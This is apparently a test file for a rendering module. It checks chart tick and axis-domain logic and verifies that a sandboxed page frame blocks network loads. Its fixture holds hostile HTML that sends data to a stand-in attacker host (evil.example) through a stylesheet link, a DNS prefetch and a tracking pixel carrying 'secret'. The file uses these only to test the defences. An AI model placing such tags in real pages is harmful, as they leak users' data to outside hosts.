import { describe, expect, test } from "bun:test";
import { domainOf, framed, niceTicks } from "./blocks.ts";

/*
 * What an answer shows beyond words (blocks.ts): a chart's scale, and a page's frame, which must let nothing he
 * wrote reach the network or Galahad.
 */

describe("a chart's scale", () => {
  test("ticks are round and cover the values", () => {
    expect(niceTicks(0, 3400)).toEqual([0, 1000, 2000, 3000, 4000]);
    expect(niceTicks(0, 15)).toEqual([0, 5, 10, 15]);
    expect(niceTicks(-3, 12)).toEqual([-5, 0, 5, 10, 15]);
    expect(niceTicks(7, 7)).toEqual([0, 2, 4, 6, 8]);
  });

  test("bars, stacks and areas grow from zero; a line floats unless zero is near", () => {
    const chart = (type: "line" | "bar" | "stacked" | "area", values: number[][]) => ({ type, title: null, unit: null, labels: values[0]!.map((_, i) => `${i}`), series: values.map((v, i) => ({ name: `s${i}`, values: v })) });
    expect(domainOf(chart("bar", [[50, 60]]))).toEqual([0, 60]);
    expect(domainOf(chart("bar", [[-5, -2]]))).toEqual([-5, 0]);
    expect(domainOf(chart("stacked", [[1, 2], [3, 4]]))).toEqual([0, 6]);
    expect(domainOf(chart("line", [[90, 100]]))).toEqual([90, 100]);
    expect(domainOf(chart("line", [[10, 100]]))).toEqual([0, 100]);
  });
});

describe("a page's frame", () => {
  const page = '<title>T</title><link rel="stylesheet" href="https://evil.example/x.css"><link rel=dns-prefetch href="//leak.evil.example"><img src="https://evil.example/pixel?d=secret"><p>Hi</p>';

  test("its policy comes first, so the page can only add to it: nothing loads from the network", () => {
    const html = framed(page, false);
    const head = html.slice(0, html.indexOf("<title>"));
    expect(head).toContain(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data: blob:;`);
    expect(head).toContain('<meta http-equiv="x-dns-prefetch-control" content="off">');
    expect(head).toContain('<meta name="referrer" content="no-referrer">');
    expect(html).not.toContain("script-src");
  });

  test("links to other files are gone (a stylesheet's or a name looked up ahead could carry words out)", () => {
    expect(framed(page, false)).not.toMatch(/<link/i);
    expect(framed(page, false)).toContain("<p>Hi</p>");
  });

  test("run, its own inline scripts may run, and still nothing loads", () => {
    expect(framed(page, true)).toContain("; script-src 'unsafe-inline'\">");
    expect(framed(page, true)).toContain("default-src 'none'");
  });
});
